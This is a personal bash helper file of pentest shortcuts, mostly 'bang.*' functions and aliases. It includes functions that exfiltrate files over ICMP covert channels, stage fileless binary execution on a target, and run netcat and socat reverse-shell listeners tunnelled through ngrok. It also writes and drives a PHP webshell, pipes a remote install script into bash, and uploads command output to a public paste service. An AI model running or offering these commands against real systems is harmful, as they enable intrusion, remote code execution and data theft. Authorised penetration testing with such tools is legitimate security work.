# personnal shortcuts
# 'source' it before making pentest

alias firefox='(&>/dev/null firefox &)'
alias hgrep='history | grep'
alias screenshot='flameshot gui'
alias bang.screen.launch-and-detach='screen -d -m'
alias bang.screen.reattach='screen -r'
alias bang.screen.list='screen -ls'
alias pup='pup --color'
alias pup.script='pup --color script'
alias bang.download-text-editor.cpy="echo 'curl https://getmic.ro | bash' | cpy"
alias bang.wget.mirror-site='wget --mirror --convert-links --html-extension --wait=2 -o log'
alias bang.json-visio.link='echo "https://jsonvisio.com/editor"'

## Queensono send file
bang.queensono.send.file() {
if [ "$1" = "-h" ]; then
    echo "Send file using ICMP: bang.queensono.send.file \$TA [FILENAME]"
else
    qssender send file -d 1 -r $1 $2
fi
}

## Queensono send file cpy
bang.queensono.send.file.cpy() {
if [ "$1" = "-h" ]; then
    echo "Copy line to send file with ICMP: bang.queensono.send.file.cpy \$AA [FILENAME]"
else
    echo "qssender send file -d 1 -r $1 $2" | cpy
fi
}

## Queensono send
bang.queensono.send() {
if [ "$1" = "-h" ]; then
    echo "Send message using ICMP: bang.queensono.send \$TA \"[MSG]\""
else
    qssender send "$2" -d 1 -r $1
fi
}

## Queensono send cpy
bang.queensono.send.cpy() {
if [ "$1" = "-h" ]; then
    echo "Copy line to send message with ICMP: bang.queensono.send.cpy \$AA \"[MSG]\""
else
    echo "qssender send \"$2\" -d 1 -r $1 -N" |cpy
fi
}

## Queensono receive file
bang.queensono.receive.file() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Receive file using ICMP server: bang.queensono.receive.file [FILENAME]"
else
    qsreceiver receive -p -f $1
fi
}

## Queensono receive file cpy
bang.queensono.receive.file.cpy() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Copy line to receive file using ICMP server: bang.queensono.receive.file.cpy [FILENAME]"
else
    echo "qsreceiver receive -p -f $1" | cpy
fi
}

## Queensono receive
bang.queensono.receive() {
if [ "$1" = "-h" ]; then
    echo "Receive message using ICMP: bang.queensono.receive"
else
     qsreceiver receive
fi
}

## Queensono receive cpy
bang.queensono.receive.cpy() {
if [ "$1" = "-h" ]; then
    echo "Copy line to receive message using ICMP: bang.queensono.receive.cpy"
else
     echo "qsreceiver receive" | cpy
fi
}

## Fileless-xec as client (Launch a server and copy line to launch on target)
bang.flx.client.cpy() {
if [ "$1" = "-h" ]; then
    echo "Copy line to send binary to a fileless-xec server: bang.flx.client.cpy \$AA \$AP [BINARY_NAME]"
else
    echo "fileless-xec http://$1:$2/$3" | cpy && echo "Command line copied to clipboard (launch it on target machine)" && python3 -m http.server $2 
fi
}

## Fileless-xec server cpy
bang.flx.serve.cpy() {
if [ "$1" = "-h" ]; then
    echo "Copy line to launch fileless-xec server (then send binary to server to stealthy execute it): bang.flx.serve.cpy \$AP"
else
    echo "fileless-xec server $1"|cpy  && echo "Command line copied to clipboard (launch it on target machine)"
fi
}

## Fileless-xec send to server
bang.flx.send() {
if [ "$1" = "-h" ]; then
    echo "Send binary to a fileless-xec server: bang.flx.send \$TA \$TP [file]"
else
    curl -X POST -F "executable=@$3" http://$1:$2/upload
fi
}

## Gitar start
bang.gitar() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Start a gitar server to ease file exchange: bang.gitar \$AA"
else
  gitar -e $1
fi
}

## "Safe" Gitar start
bang.gitar.safe() {
if [ "$1" = "-h" ]; then
    echo "Start a safe gitar server to ease file exchange (docker+https): bang.gitar.safe \$AA"
else
  docker run -it --rm --net host --cap-drop=all --cap-add=dac_override --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" ariary/gitar
fi
}

## Gitar start + url override
bang.gitar.override() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Start a gitar server with URL overriding (use it to precise proxy url of the gitar server): bang.gitar.override [PROXY_URL]"
else
  gitar -alias-override-url=$1
fi
}

## "Safe" Gitar start + url override
bang.gitar.safe-override() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Start a safe gitar server with URL overriding (use it to precise proxy url of the gitar server): bang.gitar.safe-override [PROXY_URL]"
else
  docker run --rm --net host --cap-drop=all -v "${PWD}:/gitar/exchange" ariary/gitar -alias-override-url=$1
fi
}

## Gitar server as a daemon 
bang.gitar.daemon() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Start a gitar server as a deamon: bang.gitar.daemon \$AA"
else
  nohup gitar -e $1 &
fi
}

## Kill gitar process
bang.gitar.kill() {
if [ "$1" = "-h" ]; then
    echo "Kill a gitar server (useful when launched as a daemon): bang.gitar.kill"
else
  sudo pkill -9 gitar
fi
}

## Gitar without completion
bang.gitar.no-completion() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Launch a gitar server without completion (when you are dealing with a shell that note handle completion): bang.gitar.no-completion [ATTACKER_ADDR]"
else
    gitar -e $1 -completion=false
fi
}

## curl & jse
bang.jse.after-curl.verbose() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Fetch an URL and retrieve JS in response with nice printing: bang.jse.after-curl.verbose [url]"
else
    curl -s $1 -H "Accept: text/html" | jse -u $1 -gather-src


fi
}


## extract all js from remote
bang.jse.after-curl() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Fetch an URL and retrieve JS in response: bang.jse.after-curl [url]"
else
    curl -s $1 -H "Accept: text/html" | jse -u $1 -gather-src 2>/dev/null
fi
}

## curl & TUI jse
bang.jse.tui-after-curl() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Fetch an URL and retrieve JS in response. Browse it using a Terminal based UI: bang.jse.tui-after-curl [url]"
else
    curl -s $1 -H "Accept: text/html" | jse -u $1 -tui -gather-src
fi
}

## tacos
bang.tacos.listener() {
if [ "$1" = "-h" ] || [ -z "$1" ] || [ -z "$2" ]; then
    echo "Launch socat listener waiting for reverse shell. Specify port and host: bang.tacos.listener [url] [port]"
else
    cp $HOME/.tacos/light-pty4all/* .
    cp $HOME/.local/bin/tacos .
    ./socat-listener.sh --lhost $1 --lport $2
fi
}

bang.tacos.listener++() {
if [ "$1" = "-h" ] || [ -z "$1" ] || [ -z "$2" ]; then
    echo "Launch socat listener waiting for reverse shell. Reverse shell will have shortcut preloaded (e.g. gitar) and others. Specify port and host: bang.tacos.listener++ [url] [port]"
else
    cp $HOME/.tacos/light-pty4all/* .
    cp $HOME/.local/bin/tacos .
    ./socat-listener.sh --lhost $1 --lport $2 --gitar
fi
}

alias bang.tacos.container='docker run --net host --rm -it ariary/tacos'

## NGROK
### Ngrok expose a https service
bang.expose.https() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Expose a local https service using ngrok: bang.expose.https \$AP"
else
  ngrok http https://127.0.0.1:$1
fi
}

### Ngrok expose a port
bang.expose() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Expose a local port using ngrok trough http tunnel: bang.expose \$AP"
else
  ngrok http $1
fi
}

## Ngrok expose a tcp service
bang.expose.tcp() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Expose a local tcp service using ngrok: bang.expose.tcp \$AP"
else
  ngrok tcp $1
fi
}

###  Copy Ngrok expose a tcp service
bang.expose.tcp.cpy() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Show and copy line that expose a local tcp service using ngrok: bang.expose.tcp.cpy [port]"
else
  echo "ngrok tcp $1"
  echo "ngrok tcp $1"|cpy
fi
}

alias bang.expose.show="curl -s http://127.0.0.1:4040/api/tunnels | jq '.tunnels[] | \"\\(.public_url) -> \\(.config.addr)\"' -r"

###  launch a netcat listener with a ngrok tcp tunnel
bang.expose.netcat.listener() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Expose a netcat listener with ngrok: bang.expose.netcat-listener [port]"
else
  (&>/dev/null ngrok tcp $1 &)
  echo "ngrok running in background, don't forget to kill it after:'pgrep ngrok' and 'sudo kill -9 [pid]'"
  sleep 2
  curl -s http://127.0.0.1:4040/api/tunnels | jq '.tunnels[] | "\(.public_url) -> \(.config.addr)"' -r
  nc -nlvp $1
fi
}

alias bang.webdavhere='docker run --rm -it -p 8080:80 -v "${PWD}:/srv/data/share" rflathers/webdav'

alias bang.proxycurl='curl --proxy http://127.0.0.1:8080'

bang.mitmproxy.intercept.request.domain() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Launch mitm-proxy and configure it to catch requests to a specific domain: bang.mitmproxy.intercept.request.domain [DOMAIN]"
else
  mitmproxy --intercept "~u /*$1 & ~q" #need absolute path
fi
}

bang.mitmproxy.intercept.request() {
if [ "$1" = "-h" ]; then
    echo "Launch mitm-proxy and configure it to catch all requests: bang.mitmproxy.intercept.request"
else
  mitmproxy --intercept "~q"
fi
}

bang.urlencode() {
if [ "$1" = "-h" ]; then
    echo "URL encode a texte: bang.urlencode \"[TEXT]\""
else
  python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$1"
fi
}

bang.urldecode() {
if [ "$1" = "-h" ]; then
    echo "URL decode a texte: bang.urldecode \"[TEXT]\""
else
  python3 -c "import urllib.parse; print(urllib.parse.unquote(input()))" <<< "$1"
fi
}


bang.b64encode() {
if [ "$1" = "-h" ]; then
    echo "Encode in base64 a text: bang.b64encode \"[TEXT]\""
else
    echo -n "$1" | base64 -w 0
fi
}

bang.b64decode() {
if [ "$1" = "-h" ]; then
    echo "Decode a base64 encoded text: bang.b64decode \"[TEXT]\""
else
    echo "$1" | base64 -d
fi
}

bang.domain2ip() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Find IPs behind a specific domain: bang.domain2ip [domain]"
else
    dig +short $1 @resolver1.opendns.com
fi
}



## NMAP ##
alias bang.nmap.show-script='ll /usr/share/nmap/scripts/'

bang.nmap.scan-ports() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Scan a specific port with nmapbang.nmap.scan-ports [port] OR bang.nmap.scan-ports [from]-[to]"
else
    nmap -p $1 $TA
fi
}

#Intensity 5 -> for ctf not real world use
bang.nmap.scan-top100() {
if [ "$1" = "-h" ]; then
    echo "Scan top 100 port with nmap: bang.nmap.scan-top100"
else
    nmap --top-port 100 $TA -sV --version-intensity 5
fi
}

#nmap udp
bang.nmap.udp() {
if [ "$1" = "-h" ]; then
    echo "Scan udp sevrices with nmap: bang.nmap.udp"
else
    nmap -sUV $TA -T4
fi
}

#nmap discover host alive
bang.nmap.discovery() {
if [ "$1" = "-h" ]; then
    echo "Discover alived host for a specific range: bang.nmap.discovery [RANGE]"
else
    nmap $TA -sP
fi
}

##feroxbuster
alias bang.feroxbuster='feroxbuster -u'
alias bang.feroxbuster.redirect='feroxbuster -r -u'
alias bang.feroxbuster.search-extensions='feroxbuster -x js,html,txt,pdf,json,php,doc,docx,xml -u'
alias bang.feroxbuster.only-success='feroxbuster -r -C $(seq -s, $CODE 400 599) -u'
alias bang.feroxbuster.only-error='feroxbuster -C $(seq -s, $CODE 1 399) -u'
alias bang.feroxbuster.extract-links='feroxbuster --extract-links -u'

##hakluke tools
bang.hakrawler() {
if [ "$1" = "-h" ]; then
    echo "Web crawler for gathering URLs and JavaSript file locations: bang.hakrawler [url]"
else
    echo $1 | hakrawler -subs
fi
}

##mkcert
alias bang.mkcert.install='mkcert -install'
alias bang.mkcert.uninstall="mkcert -uninstall && rm -rf $(mkcert -CAROOT) && echo 'echo \'sudo sed -i \'/BANGDNSENTRY/d\' /etc/hosts\'"

bang.mkcert.generate-cert() {
if [ "$1" = "-h" ]; then
    echo "Generate trusted cert for local app and set a specific domain: bang.mkcert.generate-cert [domain name]"
else
    mkcert -key-file key.pem -cert-file cert.pem $1 localhost 127.0.0.1 ::1 && echo "echo '127.0.0.1 $1 #BANGDNSENTRY' | sudo tee -a /etc/hosts  > /dev/null"
fi
}

## Webshell

### PHP
bang.webshell.php() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Launch a php local server hosting a webshell. Webshell response only include stdout (not stderr): bang.webshell.php [port]"
else
    echo "<?php system(\$_GET['cmd']);?>" > webshell.php && (&>/dev/null php -S localhost:$1 webshell.php&)
fi
}

bang.webshell.php.cpy() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Echo and copy line that launch a local php server hosting a webshell: bang.webshell.php.cpy [port]"
else
    echo "echo \"<?php system(\$_GET['cmd']);?>\" > webshell.php && (&>/dev/null php -S localhost:$1 webshell.php&)"
    echo "echo \"<?php system(\$_GET['cmd']);?>\" > webshell.php && (&>/dev/null php -S localhost:$1 webshell.php&)"| cpy
fi
}

bang.webshell.php.dial() {
if [ "$1" = "-h" ] || [ -z "${WSURL}" ] || [ -z "$1" ]; then
    echo "Connect and interact with an webshell HTTP server to execute a command: bang.webshell.php.dial [cmd]. (Set WSLURL env var before using it)"
else
    CMD="$@"
    curl -X GET -G $WSURL --data-urlencode "cmd=${CMD}"
fi
}

## cheat.sh
bang.cheatsheet() {
if [ "$1" = "-h" ]; then
    echo "Get cheat sheet (~man page) for a specific [cmd]: bang.cheatsheet [cmd]"
else
    CMD="$@"
    curl cheat.sh/$CMD
fi
}

## static-get
bang.static-get() {
if [ "$1" = "-h" ]; then
    echo "Get static unix binary: bang.static-get [binary]"
else
    static-get $1
fi
}

## SPRUNGE
bang.sprunge() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Generate an URL containing the output of a command: bang.sprunge [cmd]"
else
    $@ | curl -F 'sprunge=<-' http://sprunge.us
fi
}

bang.sprunge.cpy() {
if [ "$1" = "-h" ] || [ -z "$1" ]; then
    echo "Copy line to generate an URL containing the output of a command: bang.sprunge.cpy [cmd]"
else
    CMD="$@"
    echo "$CMD | curl -F 'sprunge=<-' http://sprunge.us" | cpy
fi
}

##List all bang aliases
bang.aliases() {
export ROSE='\033[1;35m'
export NC='\033[0m'

echo -e "bang.download-text-editor.cpy\t\t${ROSE}Copy command line to dl micro (a standalone text editor). Useful to dl it on machine where you don't have vim or nano${NC}"

echo -e "bang.expose.show\t\t${ROSE}Show ngrok tunnel current configuration${NC}"

echo -e "bang.feroxbuster\t\t${ROSE}Perform a basic feroxbuster scan${NC}"
echo -e "bang.feroxbuster.redirect\t\t${ROSE}Perform a basic feroxbuster scan and follow redirects${NC}"
echo -e "bang.feroxbuster.search-extensions\t\t${ROSE}Perform a feroxbuster scan to retrieve php,docx,doc,xml,json,pdf,txt,html and js files${NC}"
echo -e "bang.feroxbuster.only-success\t\t${ROSE}Perform feroxbuster scan a filter on success response code (0-399)${NC}"
echo -e "bang.feroxbuster.only-error\t\t${ROSE}Perform feroxbuster scan a filter on error response code (400-599)${NC}"
echo -e "bang.feroxbuster.extract-links\t\t${ROSE}Perform feroxbuster scan and extract links from body${NC}"

echo -e "bang.find\t\t${ROSE}Grep in all bang shortcuts & aliases${NC}"

echo -e "bang.json-visio.link\t\t${ROSE}Echo jsin-viso link${NC}"

echo -e "bang.mkcert.install\t\t${ROSE}Add mkcert to the  local trust store(curl, browsers etc)${NC}"
echo -e "bang.mkcert.uninstall\t\t${ROSE}Uninstall mkcert cert from local trust store${NC}"

echo -e "bang.nmap.show-script\t\t${ROSE}Show nmap scripts location${NC}"

echo -e "bang.proxycurl\t\t${ROSE}Perorm a curl request using a local proxy listening on http://127.0.0.1:8080: bang.proxycurl [URL]${NC}"


echo -e "bang.screen.launch-and-detach\t\t${ROSE}Launch a process with screen and detach from the screen virtual terminal (reattach with bang.screen.reattach)${NC}"
echo -e "bang.screen.reattach\t\t${ROSE}Reattach a screen screen virtual terminal which was detached (You can re-detach w/ CTRL+A D)${NC}"
echo -e "bang.screen.ls\t\t${ROSE}List all existent screens (virtual terminal)${NC}"

echo -e "bang.tacos.container\t\t${ROSE}Launch socat listener in docker for interactive revshell${NC}"

echo -e "bang.webdavhere\t\t${ROSE}Launch a webdav server (file exchange) on port 8080 for the current repository (useful for file exchange with a windows host). then 'bang.expose 8080' & access files w/ '\\\[NGROK_URL]@\share'${NC}"


echo -e "bang.wget.mirror-site\t\t${ROSE}Make an offline copy of a website${NC}"

echo -e "cpy\t\t${ROSE}Copy stdin to clipboard${NC}"

echo -e "fsink\t\t${ROSE}find sinks in js code${NC}"
echo -e "fsource\t\t${ROSE}find sources in js code${NC}"

echo -e "hgrep\t\t${ROSE}Grep in history command${NC}"


echo -e "pup\t\t${ROSE}Color html input (ex: curl https://google.fr | pup)${NC}"
echo -e "pup.script\t\t${ROSE}Retrieve script tag in html input (ex: curl https://google.fr | pup.script)${NC}"

echo -e "screenshot\t\t${ROSE}Take a screenshot${NC}"
}

## List bang functions
bang.ls() {
    # SHORTCUT
    bold=$(tput bold)
    normal=$(tput sgr0)
    echo "${bold}SHORTCUT${normal}"

    exclude=(bang.ls bang.aliases)

    #must differenciate between zsh and bash for multiline var -> array trick
    if [ -n "$ZSH_VERSION" ]; then
        FUNC=("${(@f)$(cat $HOME/.bang/bang | awk '!/^main[ (]/ && /^[^ {}]+ *\(\)/ { gsub(/[()]/, "", $1); print $1}')}")
    elif [ -n "$BASH_VERSION" ]; then
        FUNC=$(cat $HOME/.bang/bang | awk '!/^main[ (]/ && /^[^ {}]+ *\(\)/ { gsub(/[()]/, "", $1); print $1}')
        SAVEIFS=$IFS
        IFS=$'\n'
        FUNC=($FUNC)
        IFS=$SAVEIFS  
    fi

    for del in ${exclude[@]}
    do
        FUNC=("${FUNC[@]/$del}") #Quotes when working with strings
    done

    OUTPUT=""
    if [ -n "$ZSH_VERSION" ]; then

        for f in $FUNC
        do
            OUTPUT=$OUTPUT$(echo -n "$f"; \
            echo -n "\t\t\033[1;35m" ;\
            HELP=$($f -h) ;\
            echo "$HELP";\
            echo -n "\033[0m";)
        done
    elif [ -n "$BASH_VERSION" ]; then
        for (( i=0; i<${#FUNC[@]}; i++ ))
        do  
            OUTPUT=$OUTPUT$(echo "\n";echo -n "${FUNC[$i]}\t";\
            HELP=$(${FUNC[$i]} -h 2>/dev/null);\
            echo -e "\t\t\033[1;35m$HELP\033[0m";)
        done
    fi

    echo -e $OUTPUT | column -t -s $'\t'

    # ALIASES
    echo
    echo "${bold}ALIASES${normal}"
    bang.aliases | column -t -s $'\t'
}

alias bang.find='bang.ls | grep'
